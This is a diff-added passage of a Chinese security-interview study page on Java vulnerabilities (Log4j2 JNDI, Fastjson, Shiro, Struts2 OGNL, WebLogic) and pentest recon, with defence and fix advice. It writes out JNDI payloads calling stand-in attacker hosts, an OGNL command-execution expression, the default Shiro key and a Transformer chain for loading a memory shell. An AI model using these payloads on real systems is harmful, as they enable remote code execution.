+<h3 id="ldap-jndi-注入是什么含攻击链"><a class="markdownIt-Anchor" href="#ldap-jndi-注入是什么含攻击链"></a> LDAP-JNDI 注入是什么？（含攻击链）</h3>
+<p>LDAP-JNDI 注入是指通过 JNDI 接口访问 LDAP 服务时触发的注入攻击，LDAP（Lightweight Directory Access Protocol）是用于查询目录服务的协议，攻击链如下：</p>
+<ol>
+<li><strong>攻击者准备</strong>：搭建恶意 LDAP 服务器，在目录中创建一个条目（Entry），并为其设置<code>javaNamingReference</code>属性（包含恶意类的名称和代码基地 URL）。</li>
+<li><strong>注入恶意 URL</strong>：攻击者将恶意 JNDI URL（<code>jndi:ldap://attacker.com/cn=evil</code>）注入目标应用的 JNDI 查找参数中。</li>
+<li><strong>应用触发查询</strong>：目标应用执行<code>lookup()</code>时，连接攻击者的 LDAP 服务器，查询指定条目，并获取<code>javaNamingReference</code>属性。</li>
+<li><strong>加载恶意类</strong>：应用根据属性中的代码基地 URL 下载恶意类（如<code>Evil.class</code>），并在本地实例化。</li>
+<li><strong>执行恶意代码</strong>：恶意类的<code>static</code>代码块或构造方法中的命令执行逻辑被触发，实现 RCE。</li>
+</ol>
+<h3 id="rmi-jndi-和-ldap-jndi-的主要区别是什么"><a class="markdownIt-Anchor" href="#rmi-jndi-和-ldap-jndi-的主要区别是什么"></a> RMI-JNDI 和 LDAP-JNDI 的主要区别是什么？</h3>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>RMI-JNDI</th>
+<th>LDAP-JNDI</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>依赖的协议</td>
+<td>RMI 协议（默认端口 1099）</td>
+<td>LDAP 协议（默认端口 389/636）</td>
+</tr>
+<tr>
+<td>恶意资源的传递形式</td>
+<td>通过<code>Reference</code>对象绑定到 RMI 注册中心</td>
+<td>通过 LDAP 目录条目的<code>javaNamingReference</code>属性传递</td>
+</tr>
+<tr>
+<td>JDK 版本限制</td>
+<td>高版本 JDK（如≥8u121）默认禁止从远程代码基地加载类</td>
+<td>高版本 JDK 对 LDAP 的限制较松，仍可加载远程类（需满足特定条件）</td>
+</tr>
+<tr>
+<td>实战利用难度</td>
+<td>较高（受 JDK 限制严格）</td>
+<td>较低（兼容性更好，限制少）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="log4j漏洞原理"><a class="markdownIt-Anchor" href="#log4j漏洞原理"></a> log4j漏洞原理</h3>
+<p>Log4j 漏洞特指 Log4j2 中的 <strong>JNDI 注入漏洞</strong></p>
+<p>Log4j2 在处理日志信息时，会对包含 <code>$&#123;&#125;</code> 格式的字符串进行特殊解析，若日志内容中包含 JNDI 相关的 lookup 语法（如 <code>$&#123;jndi:ldap://attacker.com/xxx&#125;</code>），会触发 JNDI 服务调用，从攻击者控制的服务器加载恶意类并执行，最终导致远程代码执行（RCE）。</p>
+<h3 id="apache-log4j2-远程代码执行的攻击流程是什么含攻击链"><a class="markdownIt-Anchor" href="#apache-log4j2-远程代码执行的攻击流程是什么含攻击链"></a> Apache Log4j2 远程代码执行的攻击流程是什么？（含攻击链）</h3>
+<ol>
+<li>攻击者准备恶意 payload（如 <code>$&#123;jndi:ldap://evil.com/poc&#125;</code>）；</li>
+<li>通过目标系统的输入点（如用户表单、URL 参数、API 请求等）将 payload 传入；</li>
+<li>目标系统处理输入时，使用 Log4j2 将包含 payload 的内容记录到日志中；</li>
+<li>Log4j2 解析日志中的 <code>$&#123;jndi:...&#125;</code> 占位符，触发 JNDI lookup，向 <code>evil.com</code> 发起 LDAP/RMI 请求；</li>
+<li>攻击者控制的 LDAP/RMI 服务器返回指向恶意 Java 类（如 <code>Exploit.class</code>）的路径；</li>
+<li>目标系统加载并执行该恶意类，攻击者获得远程代码执行权限（如执行 <code>calc.exe</code> 或反弹 shell）。</li>
+</ol>
+<h3 id="攻击者通常如何将-payload-注入到-log4j2"><a class="markdownIt-Anchor" href="#攻击者通常如何将-payload-注入到-log4j2"></a> 攻击者通常如何将 payload 注入到 Log4j2？</h3>
+<ul>
+<li>网页表单输入（如用户名、搜索框）；</li>
+<li>URL 参数（如 <code>?username=$&#123;jndi:ldap://evil.com&#125;</code>）；</li>
+<li>HTTP 头（如 <code>User-Agent</code>、<code>Referer</code> 等）；</li>
+<li>API 请求体（如 JSON 数据中的字段）；</li>
+<li>第三方服务交互（如消息队列、数据库查询结果中包含 payload）。 只要输入内容被 Log4j2 记录，即可触发漏洞。</li>
+</ul>
+<h3 id="如何防御-log4j2-jndi-注入漏洞"><a class="markdownIt-Anchor" href="#如何防御-log4j2-jndi-注入漏洞"></a> 如何防御 Log4j2 JNDI 注入漏洞？</h3>
+<ul>
+<li><strong>升级版本</strong>：将 Log4j2 升级至 2.15.0 及以上（修复了核心漏洞），或 2.17.0+（修复后续衍生漏洞）；</li>
+<li><strong>禁用 JNDI 功能</strong>：通过配置 <code>log4j2.formatMsgNoLookups=true</code> 禁用消息解析中的 JNDI lookup；</li>
+<li><strong>限制 JNDI 访问</strong>：在 JVM 层面添加参数 <code>-Dlog4j2.disableJndi=true</code> 或 <code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=false</code> 等，限制远程类加载；</li>
+<li><strong>输入过滤</strong>：对用户输入的 <code>$&#123;</code>、<code>jndi:</code> 等敏感字符进行过滤或转义；</li>
+<li><strong>网络隔离</strong>：限制服务器对外访问敏感协议（如 LDAP、RMI），阻止与恶意服务器通信；</li>
+<li><strong>监控与检测</strong>：通过日志监控工具检测包含恶意 JNDI 字符串的请求，及时告警。</li>
+</ul>
+<h3 id="fastjson1224-漏洞原理是什么含特征"><a class="markdownIt-Anchor" href="#fastjson1224-漏洞原理是什么含特征"></a> Fastjson1.2.24 漏洞原理是什么？（含特征）</h3>
+<p>该版本允许通过 <code>@type</code> 指定 <code>com.sun.rowset.JdbcRowSetImpl</code> 类，其 <code>setDataSourceName()</code> 方法会触发 JNDI 查找。攻击者构造 JSON 时，通过 <code>dataSourceName</code> 字段指向恶意 LDAP/RMI 服务器，反序列化时触发 RCE。</p>
+<h3 id="fastjson1247-漏洞原理是什么含特征"><a class="markdownIt-Anchor" href="#fastjson1247-漏洞原理是什么含特征"></a> Fastjson1.2.47 漏洞原理是什么？（含特征）</h3>
+<p>1.2.47 版本修复了 <code>JdbcRowSetImpl</code> 的黑名单限制，但引入了 <strong>AutoType 绕过漏洞</strong>。攻击者通过在类名前添加 <code>L</code>、类名后添加 <code>;</code>（如 <code>Lcom.sun.rowset.JdbcRowSetImpl;</code>），使其<strong>原始形式不在黑名单中</strong>绕过 Fastjson 的类名检查，但规范化后变为 <code>com.sun.rowset.JdbcRowSetImpl</code>（高危类），从而绕过校验仍可触发 JNDI 注入。</p>
+<h3 id="如何判断是否存在-fastjson-漏洞"><a class="markdownIt-Anchor" href="#如何判断是否存在-fastjson-漏洞"></a> 如何判断是否存在 Fastjson 漏洞？</h3>
+<ul>
+<li><strong>版本检测</strong>：检查项目依赖的 Fastjson 版本，若 ≤ 1.2.68，可能存在漏洞；</li>
+<li><strong>DNS请求</strong>：发送包含 <code>@type</code> 的测试 JSON，观察是否接受到DNS请求；</li>
+<li><strong>工具检测</strong>：使用漏洞扫描工具（如 FastjsonScanner、ShiroScan）自动检测；</li>
+<li><strong>特征分析</strong>：若应用返回 JSON 中包含 <code>@type</code>，或接受用户输入的 JSON 且未严格过滤，可能存在风险。</li>
+</ul>
+<h3 id="shiro-有几种漏洞类型"><a class="markdownIt-Anchor" href="#shiro-有几种漏洞类型"></a> Shiro 有几种漏洞类型？</h3>
+<p>主要为<strong>反序列化漏洞</strong>，包括：</p>
+<ul>
+<li><strong>Shiro550（CVE-2016-4437）</strong>：利用默认加密密钥伪造 <code>rememberMe</code> Cookie，触发反序列化 RCE；</li>
+<li><strong>Shiro721（CVE-2020-11989）</strong>：Padding Oracle 攻击，无需密钥即可构造恶意 Cookie 实现反序列化；</li>
+<li><strong>Shiro124（CVE-2020-17523）</strong>：JNDI 注入漏洞，通过 <code>rememberMe</code> Cookie 触发 RMI/LDAP 远程类加载。</li>
+</ul>
+<h3 id="如何判断是否存在-shiro-漏洞含-shiro-框架特征"><a class="markdownIt-Anchor" href="#如何判断是否存在-shiro-漏洞含-shiro-框架特征"></a> 如何判断是否存在 Shiro 漏洞？（含 Shiro 框架特征）</h3>
+<ul>
+<li><strong>Shiro 框架特征</strong>：
+<ul>
+<li>HTTP 响应头包含 <code>Set-Cookie: rememberMe=deleteMe; ...</code>；</li>
+<li>登录表单包含 <code>rememberMe</code> 参数（如勾选 “记住我”）；</li>
+<li>依赖 <code>shiro-core</code> 库（可通过反编译或依赖分析工具检测）。</li>
+</ul>
+</li>
+<li><strong>漏洞检测方法</strong>：
+<ul>
+<li>使用工具（如 ShiroExploit、ShiroScan）发送特制的 <code>rememberMe</code> Cookie，观察是否触发命令执行；</li>
+<li>分析响应时间：Shiro721 攻击依赖 Padding Oracle 原理，通过观察响应时间变化判断漏洞存在。</li>
+</ul>
+</li>
+</ul>
+<h3 id="apache-shiro550-反序列化漏洞原理是什么含特征"><a class="markdownIt-Anchor" href="#apache-shiro550-反序列化漏洞原理是什么含特征"></a> Apache Shiro550 反序列化漏洞原理是什么？（含特征）</h3>
+<p>Shiro 使用 AES-CBC 加密 <code>rememberMe</code> Cookie，默认密钥硬编码在代码中（如 <code>kPH+bIxk5D2deZiIxcaaaA==</code>）。攻击者可构造恶意序列化数据（如包含 CommonsCollections 链），用默认密钥加密后替换正常 Cookie。服务端解密并反序列化时，触发恶意代码执行。</p>
+<ul>
+<li>特征：
+<ul>
+<li>使用默认加密密钥；</li>
+<li>攻击需先获取服务端响应的合法 <code>rememberMe</code> Cookie（用于提取 IV）；</li>
+<li>利用工具（如 ysoserial）生成恶意序列化数据。</li>
+</ul>
+</li>
+</ul>
+<h3 id="apache-shiro721-反序列化漏洞原理是什么含特征"><a class="markdownIt-Anchor" href="#apache-shiro721-反序列化漏洞原理是什么含特征"></a> Apache Shiro721 反序列化漏洞原理是什么？（含特征）</h3>
+<ul>
+<li>Shiro 在处理 <code>rememberMe</code> Cookie 时，存在 CBC 模式下的 Padding Oracle 漏洞。攻击者通过构造特殊的加密数据，利用服务端返回的错误信息（如 “Padding is invalid”）逐步猜测加密密钥，最终构造可触发反序列化的恶意 Cookie。</li>
+<li><strong>特征</strong>：
+<ul>
+<li>无需知道加密密钥，仅依赖服务端的错误响应；</li>
+<li>攻击需多次请求（约 1000+ 次），耗时较长；</li>
+<li>利用工具（如 Shiro721Exploit）自动化攻击。</li>
+</ul>
+</li>
+</ul>
+<h3 id="ysoerial中cc链为什么不能打shiro"><a class="markdownIt-Anchor" href="#ysoerial中cc链为什么不能打shiro"></a> ysoerial中CC链为什么不能打Shiro</h3>
+<p><code>shiro</code>的反序列化利用中，如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。</p>
+<p>ysoerial中的CC链中是有Transformer[]数组</p>
+<p>用魔改的可以</p>
+<h3 id="如何修复-fastjson-和-shiro-反序列化漏洞"><a class="markdownIt-Anchor" href="#如何修复-fastjson-和-shiro-反序列化漏洞"></a> 如何修复 Fastjson 和 Shiro 反序列化漏洞？</h3>
+<ul>
+<li><strong>Fastjson 修复</strong>：
+<ol>
+<li><strong>升级版本</strong>：将 Fastjson 升级至 1.2.83+（启用 <code>safeMode</code>）或 2.0.24+（修复所有已知漏洞）；</li>
+<li><strong>禁用 AutoType</strong>：通过配置 <code>ParserConfig.getGlobalInstance().setAutoTypeSupport(false)</code> 禁用 <code>@type</code> 功能；</li>
+<li><strong>配置白名单</strong>：仅允许反序列化白名单中的类（如 <code>ParserConfig.getGlobalInstance().addAccept(&quot;com.example.&quot;)</code>）；</li>
+<li><strong>过滤输入</strong>：对用户输入的 JSON 进行严格过滤，禁止包含 <code>@type</code> 字段。</li>
+</ol>
+</li>
+<li><strong>Shiro 修复</strong>：
+<ol>
+<li><strong>更换加密密钥</strong>：修改 <code>shiro.ini</code> 中的 <code>securityManager.rememberMeManager.cipherKey</code>，使用随机生成的密钥；</li>
+<li><strong>升级版本</strong>：将 Shiro 升级至 1.9.1+（修复 Shiro721 等漏洞）；</li>
+<li><strong>禁用 rememberMe</strong>：在不需要 “记住我” 功能的场景下，通过配置 <code>securityManager.rememberMeManager.enabled = false</code> 禁用；</li>
+<li><strong>限制网络访问</strong>：通过防火墙限制 Shiro 应用对外的 LDAP/RMI 访问，防止 JNDI 注入。</li>
+</ol>
+</li>
+</ul>
+<h3 id="jdbc-mysql反序列化原理"><a class="markdownIt-Anchor" href="#jdbc-mysql反序列化原理"></a> JDBC-mysql反序列化原理</h3>
+<p>如果攻击者能够控制 JDBC 连接设置项，那么就可以通过设置其指向恶意 MySQL 服务器进行 <code>ObjectInputStream.readObject()</code> 的反序列化攻击从而 RCE。</p>
+<p>具体点说，就是通过 JDBC 连接 MySQL 服务端时，会有几个内置的 SQL 查询语句要执行，其中两个查询的结果集在 MySQL 客户端被处理时会调用 <code>ObjectInputStream.readObject()</code> 进行反序列化操作。如果攻击者搭建恶意 MySQL 服务器来控制这两个查询的结果集，并且攻击者可以控制 JDBC 连接设置项，那么就能触发 MySQL JDBC 客户端反序列化漏洞。</p>
+<p>可被利用的两条查询语句：</p>
+<ul>
+<li>SHOW SESSION STATUS</li>
+<li>SHOW COLLATION</li>
+</ul>
+<h3 id="判断struts框架"><a class="markdownIt-Anchor" href="#判断struts框架"></a> 判断Struts框架</h3>
+<ol>
+<li>
+<p><strong>通过页面错误回显判断</strong></p>
+<ul>
+<li>访问不存在的 Action 或传入特殊参数，若返回 Struts2 相关错误信息（如 “No result defined for action” 或 OGNL 解析错误），基本可确认。</li>
+<li>如果网站关闭了错误显示，这个方法无效。</li>
+</ul>
+</li>
+<li>
+<p><strong>通过 URL 后缀判断</strong></p>
+<ul>
+<li>常见后缀：<code>.do</code>、<code>.action</code>。</li>
+<li>仅作参考，可能存在误判（其他框架也可能用这些后缀）。</li>
+</ul>
+</li>
+<li>
+<p><strong>无后缀 URI 判断</strong></p>
+<ul>
+<li>如果 <code>struts.xml</code> 中常量 <code>struts.action.extension</code> 以逗号结尾或有空值，说明允许 Action 无后缀访问，此时无后缀 URI 也可能是 Struts2。</li>
+</ul>
+</li>
+<li>
+<p><strong>REST 插件默认后缀判断</strong></p>
+<ul>
+<li>
+<p>若使用 Struts2 REST 插件，其默认在 <code>struts-plugin.xml</code> 中指定的后缀为：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.xhtml</span><br><span class="line">.xml</span><br><span class="line">.json</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>访问内置管理控制台判断</strong></p>
+<ul>
+<li>
+<p>尝试访问：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/struts/webconsole.html</span><br></pre></td></tr></table></figure>
+<p>若存在并显示 Web Console，且 <code>devMode=true</code>，则为 Struts2（仅在开发模式下可能暴露）。</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="struts2-远程代码执行漏洞原理"><a class="markdownIt-Anchor" href="#struts2-远程代码执行漏洞原理"></a> Struts2 远程代码执行漏洞原理</h3>
+<p>Struts2 是基于 MVC 架构的 Java Web 框架，其核心机制是通过拦截器处理 HTTP 请求，并使用 OGNL（Object Graph Navigation Language）表达式对请求参数进行动态求值。漏洞的根本原因在于 <strong>OGNL 表达式解析过程中未对用户输入进行严格过滤</strong>，导致攻击者可注入恶意表达式执行任意代码。</p>
+<h5 id="核心原理步骤"><a class="markdownIt-Anchor" href="#核心原理步骤"></a> <strong>核心原理步骤</strong>：</h5>
+<ol>
+<li>
+<p><strong>OGNL 表达式解析</strong>： Struts2 在处理请求参数时，会将参数值作为 OGNL 表达式解析。例如，表单字段或 URL 参数中的 <code>$&#123;表达式&#125;</code> 会被动态求值。</p>
+</li>
+<li>
+<p><strong>恶意表达式注入</strong>： 攻击者构造特殊参数值，利用 OGNL 的强大功能（如访问静态方法、调用系统命令）执行代码。例如：</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#context[<span class="string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]=<span class="literal">false</span>, #_memberAccess[<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>]=<span class="literal">true</span>, <span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;id&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
+<p>该表达式通过修改访问权限并调用 <code>Runtime.getRuntime().exec()</code> 执行系统命令。</p>
+</li>
+<li>
+<p><strong>常见攻击向量</strong>：</p>
+<ul>
+<li><strong>S2-001</strong>：通过修改 <code>Content-Type</code> 请求头注入 OGNL 表达式。</li>
+<li><strong>S2-016</strong>：利用 <code>redirect:</code> 或 <code>redirectAction:</code> 结果类型注入表达式。</li>
+<li><strong>S2-045</strong>：Jakarta Multipart 解析器漏洞，通过构造特殊的 <code>Content-Type</code> 头触发 RCE。</li>
+</ul>
+</li>
+</ol>
+<h3 id="weblogic框架漏洞"><a class="markdownIt-Anchor" href="#weblogic框架漏洞"></a> Weblogic框架漏洞</h3>
+<p><strong>XMLDecoder反序列化漏洞</strong>：构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞</p>
+<p><strong>T3协议反序列化漏洞</strong>：远程攻击者通过T3协议在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用） 机制的缺陷，通过 JRMP 协议（Java远程方法协议）达到执行任意反序列化代码，进而造成远程代码执行</p>
+<p><strong>未授权访问漏洞</strong></p>
+<h3 id="snakeyaml反序列化原理"><a class="markdownIt-Anchor" href="#snakeyaml反序列化原理"></a> SnakeYaml反序列化原理</h3>
+<p>SnakeYaml支持反序列化Java对象，所以当Yaml.load()函数的参数外部可控时，攻击者就可以传入一个恶意类的yaml格式序列化内容，当服务端进行yaml反序列化获取恶意类时就会触发SnakeYaml反序列化漏洞</p>
+<p><code>!!</code>相当于fastjson的@type，但SnakeYaml只能调用非public、static及transient作用域的setter方法</p>
+<p>例如：JdbcRowSetImpl利用链能通过设置dataSourcename字段指向恶意 LDAP/RMI 服务器，反序列化时导致RCE</p>
+<h3 id="二次反序列化有哪些"><a class="markdownIt-Anchor" href="#二次反序列化有哪些"></a> 二次反序列化有哪些</h3>
+<p><code>SignedObject#getObject</code></p>
+<p><code>RMIConnector</code></p>
+<p><code>WrapperConnectionPoolDataSource</code></p>
+<p><code>JtaTransactionManager</code></p>
+<h3 id="tomcat中jsp的绕过"><a class="markdownIt-Anchor" href="#tomcat中jsp的绕过"></a> Tomcat中JSP的绕过</h3>
+<p>Unicode 编码绕过</p>
+<p>文件编码</p>
+<p>JSP标签绕过</p>
+<p>JSP 拼接闭合绕过</p>
+<h3 id="java内存马"><a class="markdownIt-Anchor" href="#java内存马"></a> java内存马</h3>
+<p>以tomcat的servletAPI型内存⻢为例</p>
+<p>创建了⼀个恶意的servlet，然后获取当前的StandardContext，然后将恶意servlet封装成wrapper添加到StandardContext的children当中，最后添加ServletMapping将访问的URL和wrapper进⾏绑定。</p>
+<h3 id="java代审"><a class="markdownIt-Anchor" href="#java代审"></a> java代审</h3>
+<ol>
+<li>使⽤mybatis框架处理sql语句，其中${包裹的参数如果是⽤户可控的就可能存在sql注⼊。</li>
+<li>Java中的命令执⾏函数，Runtime类的exec⽅法和ProcessBuilder类</li>
+<li>反序列化函数和类加载函数，例如readObject、Classload.defineClass类加载⽅法等。</li>
+<li>通过pom.xml排查引⼊的框架版本是否存在漏洞。</li>
+<li>还有⽂件上传/⽂件读取接⼝是否有充⾜限制，是否存在任意⽂件上传和⽂件任意读取</li>
+<li>还了解⼀些例如codeql、Fortify SCA⾃动化代码审计⼯具</li>
+</ol>
+<h3 id="java反序列化绕waf"><a class="markdownIt-Anchor" href="#java反序列化绕waf"></a> java反序列化绕WAF</h3>
+<p>二次反序列化</p>
+<p>利用<strong>UTF-8 Overlong Encoding</strong> ：UTF-8 Overlong Encoding的本质是利用 UTF-8 编码规则的冗余性，使用<strong>超过法定长度的字节序列</strong>来表示一个简单的 ASCII 字符。简单来说就是**利用“多字节表示单字节”**从而绕过流量层面或序列化层面的检测</p>
+<p>脏数据绕过</p>
+<h3 id="高版本下绕过templatesimpl"><a class="markdownIt-Anchor" href="#高版本下绕过templatesimpl"></a> 高版本下绕过templatesImpl</h3>
+<p>通过<code>MethodHandlers</code>的内部类<code>Lookup</code>来加载字节码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(MethodHandles.class),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;lookup&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;defineClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;memcode&#125;),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">       &#125;;</span><br></pre></td></tr></table></figure>
+<h2 id="渗透"><a class="markdownIt-Anchor" href="#渗透"></a> 渗透</h2>
+<h3 id="渗透测试思路"><a class="markdownIt-Anchor" href="#渗透测试思路"></a> 渗透测试思路</h3>
+<p>遵循 “规划→执行→报告” 流程：</p>
+<ol>
+<li><strong>前期规划</strong>：明确测试范围、目标、时间、规则（如禁止破坏数据、禁止影响业务），签订授权协议。</li>
+<li><strong>信息收集</strong>：如后文所述，获取目标资产、技术栈、攻击面信息。</li>
+<li><strong>漏洞识别</strong>：通过扫描工具（如 Nessus、AWVS）、手动测试（如 SQL 注入检测、XSS 测试）发现漏洞。</li>
+<li><strong>漏洞利用</strong>：尝试利用漏洞（如 SQL 注入获取数据、上传 webshell 控制服务器），验证漏洞危害性。</li>
+<li><strong>权限提升</strong>：从 Webshell 提权至系统权限（如利用 Windows 漏洞、Linux SUID 提权），扩大控制范围。</li>
+<li><strong><a target="_blank" rel="noopener" href="https://hilang.cloud/tag/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></strong>（若范围包含内网）：横向移动（如远程桌面、IPC$ 共享）、获取域控权限。</li>
+<li><strong>清理痕迹与报告</strong>：删除测试文件、日志，输出漏洞详情、利用步骤、修复建议。</li>
+</ol>
+<h3 id="信息收集步骤"><a class="markdownIt-Anchor" href="#信息收集步骤"></a> 信息收集步骤</h3>
+<p>以 “目标为某企业官网（<a href="https://example.com/">example.com</a>）” 为例：</p>
+<ol>
+<li>基础信息：
+<ul>
+<li>WHOIS 查询（域名注册人、邮箱、过期时间）；</li>
+<li>DNS 记录（A 记录→IP，CNAME→CDN / 子域名，MX→邮件服务器）。</li>
+<li>判断 CDN 存在及获取真实 IP</li>
+</ul>
+</li>
+<li>网络资产：
+<ul>
+<li>子域名枚举（工具 + 搜索引擎：site:example.com -www）；</li>
+<li>IP 反查（旁站扫描，通过 Censys 查该 IP 绑定的其他域名）；</li>
+<li>端口扫描（Nmap -sV -p- [IP]，识别开放端口及服务版本）。</li>
+<li>C 段嗅探（同网段扫描）</li>
+</ul>
+</li>
+<li>应用层信息：
+<ul>
+<li>指纹识别（Wappalyzer：如 “PHP+Nginx+WordPress”）；</li>
+<li>目录扫描（Dirsearch -u <a href="https://example.com/">https://example.com</a> -e php,txt）；</li>
+<li>查找后台（常见路径爆破 + 查看页面源码注释）。</li>
+<li>API 接口</li>
+</ul>
+</li>
+<li>敏感信息：
+<ul>
+<li>检查 robots.txt、sitemap.xml；</li>
+<li>搜索 GitHub 是否有 <a href="https://example.com/">example.com</a> 相关代码泄露；</li>
+<li>查看 Wayback Machine 历史快照，寻找旧版本漏洞（如过时的 API 接口）。</li>
+</ul>
+</li>
+<li>人员信息：
+<ul>
+<li>招聘网站（如拉勾网）查该企业招聘岗位，获取技术栈和邮箱格式（如 <a href="mailto:name@example.com">name@example.com</a>）；</li>
+<li>领英查员工姓名，尝试猜测账号（如 <a href="mailto:zhangsan@example.com">zhangsan@example.com</a>）。</li>
+</ul>
+</li>
+<li>信息整合与漏洞分析：
+<ul>
+<li>整理关键信息；</li>
+<li>漏洞利用方向</li>
+</ul>
+</li>
+</ol>
+<h3 id="常见端口服务"><a class="markdownIt-Anchor" href="#常见端口服务"></a> 常见端口服务</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">21端口：FTP</span><br><span class="line">22端口：SSH</span><br><span class="line">23端口：Telnet 服务</span><br><span class="line">25端口：邮件</span><br><span class="line">80端口：HTTP 服务</span><br><span class="line">443端口：HTTPS 服务</span><br><span class="line">445端口：公共文件系统</span><br><span class="line"></span><br><span class="line">1433端口：SQL Server</span><br><span class="line">1521端口：Oracle</span><br><span class="line">3306端口：MySQL</span><br><span class="line">5432端口：PostgreSQL</span><br><span class="line">27017端口：MongoDB</span><br><span class="line">3389端口：远程桌面端口</span><br><span class="line">6379端口：Redis</span><br><span class="line">7001端口：WebLogic</span><br><span class="line">8080端口：8080 端口是被用于 WWW 代理服务的，可以实现网页浏览，比如 Tomcat</span><br></pre></td></tr></table></figure>
+<h3 id="什么是-cdncdn-的作用是什么"><a class="markdownIt-Anchor" href="#什么是-cdncdn-的作用是什么"></a> 什么是 CDN？CDN 的作用是什么？</h3>
+<ul>
+<li><strong>CDN（Content Delivery Network，内容分发网络）</strong>：是一组分布在不同地理位置的服务器集群，通过负载均衡、内容缓存等技术，将源站内容分发到离用户最近的节点，实现内容快速传输。</li>
+<li><strong>作用</strong>：
+<ul>
+<li>加速内容访问（减少用户与源站的物理距离）；</li>
+<li>减轻源服务器压力（流量分散到边缘节点）；</li>
+<li>提高可用性（某节点故障时自动切换到其他节点）；</li>
+<li>增强安全性（抵御 DDoS 攻击，隐藏源站 IP）。</li>
+</ul>
+</li>
+</ul>
+<h3 id="如何判断目标是否存在-cdn"><a class="markdownIt-Anchor" href="#如何判断目标是否存在-cdn"></a> 如何判断目标是否存在 CDN？</h3>
+<p>判断目标是否使用 CDN 的核心是检测其 IP 地址是否 “多节点分布式”，常用方法：</p>
+<ul>
+<li><strong>多节点 ping 测试</strong>：从不同地区（如国内不同省份、国外）ping 目标域名，若返回的 IP 地址不同，大概率存在 CDN；</li>
+<li><strong>DNS 解析查看</strong>：通过 <code>nslookup</code> 或 <code>dig</code> 命令查询域名的 DNS 记录，若返回多个 IP 且来自不同运营商（如阿里云、腾讯云、Cloudflare 等），可能存在 CDN；</li>
+<li><strong>在线工具检测</strong>：使用 WhatIsMyIP、CDN Finder 等工具，直接查询域名是否使用 CDN；</li>
+<li><strong>子域名排查</strong>：主域名可能用 CDN，但部分子域名（如 <code>mail.xxx.com</code>、<code>ftp.xxx.com</code>）可能未使用，若子域名 IP 固定，可能为源站 IP。</li>
+</ul>
+<h3 id="如何绕过-cdn-找真实-ip-地址"><a class="markdownIt-Anchor" href="#如何绕过-cdn-找真实-ip-地址"></a> 如何绕过 CDN 找真实 IP 地址？</h3>
+<p>绕过 CDN 的核心是 “找到与源站直接交互的入口”，五种方法：</p>
+<ol>
+<li><strong>子域名遍历</strong>：主域名用 CDN 但子域名可能未用（如 <code>admin.xxx.com</code>、<code>test.xxx.com</code>），解析子域名获取 IP 后，验证是否为源站（如访问该 IP 能否打开主站内容）；</li>
+<li><strong>邮件头分析</strong>：目标网站发送的邮件（如注册通知、营销邮件）中，<code>Received</code> 字段会记录邮件服务器的 IP，该 IP 可能与源站同网段；</li>
+<li><strong>历史 DNS 记录查询</strong>：通过工具（如 DNSlytics、SecurityTrails）获取目标域名过去解析的 IP，尝试访问这些 IP 验证是否为源站；</li>
